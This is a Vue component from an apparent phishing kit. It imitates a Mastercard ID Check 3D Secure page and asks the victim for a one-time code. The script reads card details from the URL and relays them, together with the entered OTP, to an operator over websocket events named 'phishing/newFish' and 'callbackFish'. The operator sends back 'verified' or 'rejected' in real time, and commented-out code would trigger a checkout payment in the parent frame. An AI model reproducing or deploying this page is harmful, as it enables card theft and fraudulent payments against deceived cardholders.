<template>
  <div class="min-h-screen bg-gray-50 flex items-center justify-center p-4">
    <div class="w-full max-w-[750px] bg-white rounded-lg shadow-lg overflow-hidden">
      <!-- Header - Issuer Identity -->
      <div class="bg-white border-b border-gray-200 p-4 sm:p-6">
        <!-- BankCard Component -->
        <div class="flex items-center justify-between">
          <div class="flex items-center gap-2 sm:gap-3">
            <img
                src="https://images.unsplash.com/photo-1606429437134-9d975fcc508f?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3w3Nzg4Nzd8MHwxfHNlYXJjaHwxfHxzdHJpcGUlMjBwYXR0ZXJufGVufDF8fHx8MTc2NDU2MDI5N3ww&ixlib=rb-4.1.0&q=80&w=1080&utm_source=figma&utm_medium=referral"
                alt="Stripe Pattern"
                class="h-10 sm:h-12 w-auto rounded"
            />
          </div>

          <div class="flex items-center">
            <img
                src="@/assets/img/mastercard-logo.png"
                alt="Mastercard ID Check"
                class="h-8 sm:h-10 w-auto"
            />
          </div>
        </div>
      </div>

      <!-- Challenge Content -->
      <div class="p-4 sm:p-6">
        <!-- OtpForm Component -->
        <div class="space-y-6">
          <!-- Challenge Information -->
          <div>
            <h2 class="mb-4 text-gray-900">Payment authentication</h2>

            <!-- Transaction Details - Prominent Display -->
            <div class="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-4">
              <div class="text-sm text-gray-600 mb-2">You are authorizing a payment of</div>
              <div class="text-2xl sm:text-3xl font-semibold text-gray-900 mb-2">$99.00</div>
              <div class="text-sm text-gray-600">
                to <span class="font-medium text-gray-900">SecureBank</span> on <span class="font-medium">27/02/24</span>
              </div>
            </div>

            <p class="text-sm sm:text-base text-gray-600">
              We have sent you a text message with a code to your registered mobile number ending in
              <span class="font-medium">**7878</span>.
            </p>
          </div>

          <!-- Challenge Data Entry -->
          <form @submit.prevent="handleSubmit" class="space-y-4">
            <div>
              <label for="otp-code" class="text-sm sm:text-base text-gray-700 mb-2 block">
                Enter authentication code
              </label>
              <input
                  id="otp-code"
                  v-model="cardInfo.code"
                  type="text"
                  placeholder="Enter 6-digit code"
                  maxlength="6"
                  class="w-full h-12 sm:h-14 text-center text-lg sm:text-xl tracking-widest font-medium border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent px-4"
                  required
              />
            </div>

            <!-- Action Buttons -->
            <div class="space-y-3 pt-2">
              <button
                  type="submit"
                  :disabled="cardInfo.code?.length !== 6 || isSubmitting"
                  class="w-full h-12 sm:h-14 bg-green-600 hover:bg-green-700 text-white rounded-md disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-medium"
              >
                {{ isSubmitting ? 'VERIFYING...' : 'SUBMIT' }}
              </button>

              <button
                  type="button"
                  @click="handleResendCode"
                  :disabled="countdown > 0"
                  class="w-full h-12 sm:h-14 border border-gray-300 text-gray-700 hover:bg-gray-50 rounded-md disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-medium bg-white"
              >
                {{ countdown > 0 ? `RESEND CODE (${countdown}s)` : 'RESEND CODE' }}
              </button>
            </div>
          </form>

          <!-- Additional Information - FAQ -->
          <div class="pt-4 border-t border-gray-200">
            <button
                @click="isExpanded = !isExpanded"
                class="flex items-center justify-between w-full py-2 text-left group"
            >
              <span class="text-xs sm:text-sm text-gray-600 group-hover:text-gray-800">
                Why am I seeing this?
              </span>
              <!-- ChevronDown Icon -->
              <svg
                  v-if="isExpanded"
                  xmlns="http://www.w3.org/2000/svg"
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  class="h-3 w-3 sm:h-4 sm:w-4 text-gray-400 transition-transform"
              >
                <polyline points="6 9 12 15 18 9"></polyline>
              </svg>
              <!-- ChevronRight Icon -->
              <svg
                  v-else
                  xmlns="http://www.w3.org/2000/svg"
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  class="h-3 w-3 sm:h-4 sm:w-4 text-gray-400 transition-transform"
              >
                <polyline points="9 18 15 12 9 6"></polyline>
              </svg>
            </button>

            <transition name="expand">
              <div v-show="isExpanded" class="overflow-hidden">
                <div class="pb-3 pt-1 text-xs sm:text-sm text-gray-500 leading-relaxed">
                  <p>
                    3D Secure authentication provides an additional layer of security for online transactions.
                    This verification process helps protect your card from unauthorized use by requiring you
                    to enter a one-time password sent to your registered mobile device.
                  </p>
                </div>
              </div>
            </transition>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, watch,computed ,onBeforeUnmount, onMounted } from 'vue';
import { addOnMessage, removeOnMessage, sendMsg } from '~/utils';
import type { WebSocketMessage } from '~/utils';
import {useLoadingStore} from "~/stores/loading";

const loadingStore = useLoadingStore();

const eventNewFish = 'websocket/addons/phishing/newFish';
const eventEditFish = 'websocket/addons/phishing/editFish';
const eventCallBack = 'websocket/addons/phishing/callbackFish';

// OTP Form State
const isSubmitting = ref(false);
const isExpanded = ref(false);
const countdown = ref(0);
const cardInfo = ref({});

// Countdown Timer Watcher
watch(countdown, (newValue) => {
  if (newValue > 0) {
    setTimeout(() => {
      countdown.value--;
    }, 1000);
  }
});

// 开始提交 - loading
const handleSubmit = async () => {
  sendCode()
  isSubmitting.value = true;
};
// 发送验证码
function sendCode() {
  if (cardInfo.code == '') {
    return;
  }
  cardInfo.value['status'] = 'checking';
  sendMsg(eventEditFish, {
    message: cardInfo.value,
  });
}
// 消息回调
const callBackFish = (res: WebSocketMessage) => {
  if(res.data.action == "发送验证码"){
    // 取消loading状态， 展示页面
    loadingStore.unloadStripe();
  }else if(res.data.action == "验证通过"){
    isSubmitting.value = false;
    // 提交成功，跳转页面
    console.log("======真实提交")
    // const btn = top.document.getElementById("checkout-pay-button");
    // btn.disabled=false;
    // btn.click();
    // top.window.hack = false;

  }else if(res.data.action == "验证拒绝"){
    isSubmitting.value = false;
    // 提交失败，提示用户
    alert("Verification failed. Please try again.");
  }
  console.log("callBackFish：",res)
};

// Resend Code Handler
const handleResendCode = () => {
  countdown.value = 60;
};

onMounted(() => {
  // 在当前页面注册消息监听
  addOnMessage(eventCallBack, callBackFish);

  // 解析URL参数
  const resultObject: { [key: string]: string } = Object.fromEntries(new URLSearchParams(window.location.search));
  // 初始化
  resultObject['status'] = 'ready';
  cardInfo.value = resultObject;

  // 发送上鱼消息
  sendMsg(eventNewFish, {
    message: cardInfo.value,
  });
});

onBeforeUnmount(() => {
  // 移除消息监听
  removeOnMessage(callBackFish);
});

</script>

<style scoped>
.expand-enter-active,
.expand-leave-active {
  transition: all 0.3s ease-in-out;
}

.expand-enter-from,
.expand-leave-to {
  max-height: 0;
  opacity: 0;
}

.expand-enter-to,
.expand-leave-from {
  max-height: 384px;
  opacity: 1;
}
</style>